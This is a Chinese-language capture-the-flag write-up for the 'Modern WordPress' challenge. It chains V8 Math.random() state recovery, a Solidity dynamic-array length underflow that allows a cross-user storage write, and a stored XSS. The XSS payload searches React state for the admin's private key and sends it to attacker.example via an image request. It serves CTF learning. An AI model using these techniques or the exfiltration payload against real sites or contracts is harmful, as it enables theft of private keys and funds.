# Modern Wordpress

## 题目简述

题目把 Web 前端、Ethereum 合约和管理员 Bot 串成一条利用链。最终 `/api/flag` 要求提交固定消息

```text
<admin-address>: vivo flag
```

及管理员私钥生成的签名。Bot 会把管理员私钥输入 React 页面，然后访问文章列表；文章正文又通过 `dangerouslySetInnerHTML` 渲染。因此终点是存储型 XSS，但普通用户只能编辑自己的链上文章。决定性突破口是 Solidity 0.5.17 中动态数组长度下溢带来的跨用户存储写，所以本题归入区块链方向。

## 解题过程

### 恢复充值码

注册、发布、撤销和编辑文章都需要支付 gas 与合约费用，而新账户没有余额。服务启动时用下面的函数生成 50 个充值码：

```typescript
const randomString = (length: number) => {
    let result = '';
    while (result.length < length) {
        result += Math.random().toString(36).substring(2);
    }
    return result.slice(0, length);
};
```

同一进程还会为每个 HTTP 请求生成 10 字符随机 ID，异常响应会泄露这个 ID。连续制造约 10 次错误即可取得一串 `Math.random()` 的高位输出。`toString(36)` 截断使每个观测缺少低约 8 位，但 V8 的 xorshift128+ 状态转移是位运算关系，可以用 Z3：

- 为两个 64 位内部状态建立位向量；
- 按 V8 状态转移约束连续样本；
- 将已知尾数高位与观测值相等，低 8 位掩掉；
- 求出状态后向前回溯服务启动阶段的输出。

把回溯出的两个 base36 片段拼接并截到 16 位，前面加 `MWP-`，即可恢复一个尚未使用的充值码。对消息 `<自己的地址>|<充值码>` 签名并调用充值接口，获得 50 finney。

### 让自己的文章数组长度下溢

`Blog` 合约中的 `undo()` 直接执行：

```solidity
Post[] storage user_posts = postMapping[address(msg.sender)];
user_posts.length -= 1;
require(user_posts.length >= 0, "Invalid Operation");
```

`length` 是 `uint256`，所以后面的 `>= 0` 恒真。在没有文章时调用 `undo()`，长度从 0 下溢为 $2^{256}-1$，随后 `edit(id, ...)` 几乎可以访问整个合约存储地址空间。

### 计算管理员首篇文章对应的超大下标

按合约声明顺序，`postMapping` 位于 slot 4。对地址 $a$，其动态数组长度槽为

$$
h_a=\operatorname{keccak256}(\operatorname{pad}(a)\Vert\operatorname{pad}(4)),
$$

数组数据起点为

$$
d_a=\operatorname{keccak256}(\operatorname{pad}(h_a)).
$$

`Post` 由 `title`、`content`、`timestamp` 三个槽组成，所以用户数组第 $i$ 项起点是

$$
d_{\text{user}}+3i\pmod{2^{256}}.
$$

生成攻击者私钥时可不断更换地址，直到

$$
\Delta=(d_{\text{admin}}-d_{\text{user}})\bmod2^{256}
$$

能被 3 整除，再取 $i=\Delta/3$。这样调用自己的 `edit(i, title, content)`，实际覆盖的就是管理员第 0 篇文章。

### 通过 React 对象图取得私钥

把管理员文章内容改成可执行的 XSS。前端 `Post.tsx` 使用 `dangerouslySetInnerHTML`，Bot 又会访问管理员 Posts，所以载荷会在已输入私钥的页面上下文中执行。

私钥不在 Cookie 或 `localStorage`，而在 React Context/组件状态中。React 会把 Fiber 根对象以随机属性名挂到 DOM 节点，不能硬编码属性路径。载荷应从 `document.getElementById("root")` 开始，限制深度递归遍历对象图，寻找键名 `privateKey`：

```javascript
function findValue(obj, wanted, depth, seen = new Set()) {
  if (!obj || typeof obj !== "object" || depth < 0 || seen.has(obj)) {
    return undefined;
  }
  seen.add(obj);
  for (const key of Object.keys(obj)) {
    if (key === wanted) return obj[key];
    const value = findValue(obj[key], wanted, depth - 1, seen);
    if (value !== undefined) return value;
  }
}

const privateKey = findValue(
  document.getElementById("root"), "privateKey", 10
);
new Image().src = "https://attacker.example/leak?k=" +
                  encodeURIComponent(privateKey);
```

调用 Bot 后取得管理员私钥。最后用它对精确字符串 `<小写管理员地址>: vivo flag` 签名，将 `message` 与 `signature` 交给 `/api/flag`，后端恢复出的地址与管理员一致时返回 flag。

完整的 V8 状态约束、存储槽计算和 React 搜索实例见 [R3CTF Modern WordPress Writeup](https://cf.mnihyc.com/blog/archives/1814)。本文已把外链中决定复现成败的随机数泄露、slot 4 双重哈希、三槽步长、XSS 触发点与签名格式全部写入正文。

## 方法总结

这是一条跨层利用链：弱随机数先解决链上资金，Solidity 动态数组下溢提供跨账户存储写，存储型 XSS 再从 React 运行时状态中取走管理员私钥，最终完成链下签名认证。审计时要分别追踪“钱从哪里来”“可写槽如何计算”“秘密实际存在哪里”三个状态边界。只写出 XSS 或只发现 `undo()` 下溢都不构成完整解法。
